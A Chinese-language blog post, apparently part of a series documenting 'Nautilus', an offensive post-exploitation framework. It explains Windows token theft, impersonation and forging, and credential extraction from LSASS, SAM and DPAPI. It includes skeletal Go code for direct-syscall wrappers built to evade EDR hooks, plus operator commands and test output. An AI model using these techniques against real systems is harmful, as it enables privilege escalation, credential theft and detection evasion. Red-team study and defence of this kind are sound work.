---
layout: single
title: "Nautilus (四)：Token 操作与凭据提取 — Windows 访问令牌攻防"
date: 2026-07-09
categories:
  - github项目
  - Nautilus
  - 后渗透
---

> **⚠️ 法律声明：本文内容仅供授权安全测试和教育研究使用。**

## 概述

进程注入解决了"在哪个进程跑代码"，但没解决"以什么身份跑代码"。Token 操作是 Windows 提权和横向移动的基础——没有 Token 操作，进程注入只能注入同权限进程。

本章讲解 Token 的核心原理和操作模式，并给出在 Nautilus 中的实现代码。

---

## 一、什么是 Windows Access Token

### 1.1 每进程一张身份证

登录 Windows 时，系统创建一个 Access Token：

```
┌─────────────────────────────────────────┐
│  Access Token                           │
├─────────────────────────────────────────┤
│  User SID:    S-1-5-21-xxx-500         │  ← 你是谁
│  Groups:      Administrators, Users...   │  ← 属于哪些组
│  Privileges:  SeDebugPrivilege,          │  ← 特殊权限
│               SeImpersonatePrivilege    │
│  Integrity:   Medium/High/System        │  ← 信任等级
│  Token Type:  Primary / Impersonation    │  ← 令牌类型
│  Session ID:  1                         │  ← 登录会话
└─────────────────────────────────────────┘
```

每个进程持有此 Token 的副本。`explorer.exe` 持有你的 Token，`lsass.exe` 持有 SYSTEM Token。

### 1.2 Token 类型

| 类型 | 能否创建进程 | 典型场景 |
|------|:---:|------|
| **Primary Token** | ✅ | `explorer.exe`、`cmd.exe` |
| **Impersonation Token** | ❌ | 服务端模拟客户端（IIS） |

只有 Primary Token 能创建新进程——意味着 StealToken 后需 `DuplicateTokenEx` 转为 Primary Token。

### 1.3 完整性级别

| 级别 | SID | 典型进程 |
|------|-----|---------|
| System (16384) | `S-1-16-16384` | `lsass.exe`, `services.exe` |
| High (12288) | `S-1-16-12288` | 管理员进程 |
| Medium (8192) | `S-1-16-8192` | 标准用户进程 |

**关键规则**：低完整性不能写高完整性进程内存。

---

## 二、五大 Token 操作

### 2.1 枚举 Token（EnumTokens）

遍历所有进程，列出各进程的用户和权限：

```
PID: 1234  User: DOMAIN\Admin     Groups: Administrators
PID: 5678  User: NT AUTHORITY\SYSTEM  Privileges: SeDebugPrivilege
```

### 2.2 窃取 Token（StealToken）

```
1. OpenProcess(PID, PROCESS_QUERY_INFORMATION)
2. OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE)
3. DuplicateTokenEx(hToken, ..., TokenPrimary)  → 转为 Primary
4. ImpersonateLoggedOnUser(hNewToken)           → 扮演该用户
```

**场景**：
- 从 `lsass.exe` 偷 SYSTEM Token → 获得最高权限
- 从 `explorer.exe` 偷域用户 Token → 访问域内文件共享

### 2.3 模拟 Token（Impersonate）

不同于 StealToken（创建新 Primary Token），Impersonate 是**线程级**的临时切换：

```go
ImpersonateLoggedOnUser(hToken)  // 线程切换身份
// ... 执行操作 ...
RevertToSelf()                    // 恢复
```

### 2.4 恢复身份（Rev2Self）

```go
RevertToSelf()
```

持续模拟会留下痕迹。OpsSec 要求：完成操作后立即恢复。

### 2.5 伪造 Token（MakeToken）

已知凭据时可凭空创建 Token：

```
LogonUserA(username, domain, password, LOGON32_LOGON_NETWORK, ...)
→ 获得 Primary Token → CreateProcessAsUser → 以该用户身份运行进程
```

---

## 三、凭据提取

Token 操作常需配合凭据提取。Windows 凭据存储在：

### 3.1 LSASS 内存

`lsass.exe` 内存中保存登录凭据（明文密码/NTLM Hash/Kerberos Ticket）。提取方案：

- 通过直接 syscall 读取 `lsass.exe` 内存（绕过 EDR hook）
- 从内存中解析 wdigest/msv/kerberos/tspkg 凭据结构
- 或生成 Minidump 离线分析

### 3.2 SAM/SECURITY 注册表

本地用户账户的 NTLM hash 存储在 `HKLM\SAM` 和 `HKLM\SECURITY`。需 SYSTEM 权限读取。

### 3.3 DPAPI 保护凭据

Chrome 密码、Wi-Fi 密码、RDP 凭据等由 DPAPI 加密。可通过 `CryptUnprotectData` 在主用户上下文中解密。

---
## 四、实现：直接 syscall 封装

Nautilus 在 `evasion/direct_syscall_windows.go` 中新增了 5 个直接 syscall 包装器，全部通过 Halo's Gate 解析的 SSN + 间接 SYSCALL 执行，不经过 ntdll.dll 的 EDR hook 点：

```go
// 打开进程 Token
func DirectNtOpenProcessToken(processHandle uintptr, desiredAccess uint32,
    tokenHandle *uintptr) uintptr

// 复制 Token（可提升为 Primary Token）
func DirectNtDuplicateToken(existingTokenHandle uintptr, desiredAccess uint32,
    objAttr *uintptr, effectiveOnly uint32, tokenType uint32,
    newTokenHandle *uintptr) uintptr

// 查询 Token 信息（用户、组、完整性级别等）
func DirectNtQueryInformationToken(tokenHandle uintptr, infoClass uint32,
    info *byte, infoLen uint32, returnLen *uint32) uintptr

// 线程 Token 模拟/恢复
func DirectNtSetInformationThread(threadHandle uintptr, infoClass uint32,
    info *byte, infoLen uint32) uintptr

// 系统进程列表枚举
func DirectNtQuerySystemInformation(infoClass uint32, info *byte,
    infoLen uint32, returnLen *uint32) uintptr
```

---

## 五、四大操作实现

### 5.1 枚举 Token（`EnumTokens`）

通过 `CreateToolhelp32Snapshot` 枚举所有进程，对每个进程用直接 syscall 打开 Token 并查询用户和完整性级别：

```go
func EnumTokens() (string, error) {
    hSnapshot, _, _ := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer evasion.DirectNtClose(hSnapshot)

    for each process {
        // 1. 直接 syscall 打开进程
        status := evasion.DirectNtOpenProcess(&hProcess,
            PROCESS_QUERY_INFORMATION, &oa, &cid)

        // 2. 直接 syscall 打开 Token
        status = evasion.DirectNtOpenProcessToken(hProcess,
            TOKEN_QUERY|TOKEN_DUPLICATE, &hToken)

        // 3. 查询 TokenUser → 解析 SID → 用户名
        status = evasion.DirectNtQueryInformationToken(
            hToken, TokenUser, &userBuf[0], 512, &retLen)

        // 4. 查询 TokenIntegrityLevel → 完整性级别
        status = evasion.DirectNtQueryInformationToken(
            hToken, TokenIntegrityLevel, &ilBuf[0], 256, &retLen)
    }
}
```

输出格式：
```
PID      Name     User                                        Integrity
0        [Idle]   NT AUTHORITY\SYSTEM                         System
4        System   NT AUTHORITY\SYSTEM                         System
...
29264    explorer DESKTOP-XXX\user                             Medium
```

### 5.2 窃取 Token（`StealToken`）

从目标进程窃取 Token，复制为 Primary Token，设置到当前线程：

```go
func StealToken(pid uint32) (string, error) {
    // 1. NtOpenProcess → 进程句柄
    // 2. NtOpenProcessToken → Token 句柄
    // 3. NtQueryInformationToken(TokenUser) → 查询用户名
    // 4. NtDuplicateToken(..., TokenPrimary) → 复制为 Primary
    // 5. NtSetInformationThread(ThreadImpersonationToken, dupToken)
    //    → 将复制的 Token 设置到当前线程
}
```

关键步骤：**必须 `DuplicateTokenEx` 转为 `TokenPrimary`**，因为直接 `OpenProcessToken` 获得的 Impersonation Token 不能用于创建进程。

### 5.3 恢复身份（`Rev2Self`）

将当前线程的 Token 设为 `NULL` 即可恢复原始进程身份：

```go
func Rev2Self() (string, error) {
    const currentThread = uintptr(0xFFFFFFFE) // GetCurrentThread()
    var nullToken uintptr = 0
    status := evasion.DirectNtSetInformationThread(currentThread,
        ThreadImpersonationToken,
        (*byte)(unsafe.Pointer(&nullToken)),
        uint32(unsafe.Sizeof(nullToken)))
}
```

### 5.4 伪造 Token（`MakeToken`）

已知用户名/密码时，通过 `LogonUserW` 创建新的登录会话 Token：

```go
func MakeToken(username, password, domain string) (string, error) {
    // 1. LogonUserW(username, domain, password,
    //    LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &hToken)
    // 2. NtSetInformationThread(ThreadImpersonationToken, hToken)
    //    → 将新 Token 设置到当前线程
}
```

注意：`LogonUserW` 需要 `SeTcbPrivilege`（作为操作系统的一部分），通常只在 SYSTEM 上下文中可用。在高完整性进程中可通过 `AdjustTokenPrivileges` 启用。

---

## 六、服务端命令

```bash
> tokens                          # 枚举所有进程的 Token
> steal-token <pid>               # 窃取目标进程 Token
> rev2self                        # 恢复原始身份
> make-token <user> <pass> <domain> # 伪造 Token
```

Web UI 中对应四个按钮：Tokens / Steal Token / Rev2Self / Make Token。

---

## 七、测试验证

```
> tokens
PID      Name     User                                        Integrity
0        [Idle]   NT AUTHORITY\SYSTEM                         System
4        System   NT AUTHORITY\SYSTEM                         System
29264    explorer DESKTOP-XXX\user                             Medium
...
✓ 成功枚举 200+ 进程

> steal-token 29264
stole token from PID 29264: DESKTOP-XXX\user
```

Token 枚举通过直接 syscall 完成，不经过 `OpenProcessToken`、`QueryInformationToken` 等被 EDR hook 的 API 调用路径。

---

## 上一篇 / 下一篇

- [Nautilus (三)：后渗透能力](2026-07-08-Nautilus(三)-后渗透能力.md)
- [Nautilus (五)：高级免杀进阶](2026-07-09-Nautilus(五)-高级免杀进阶.md)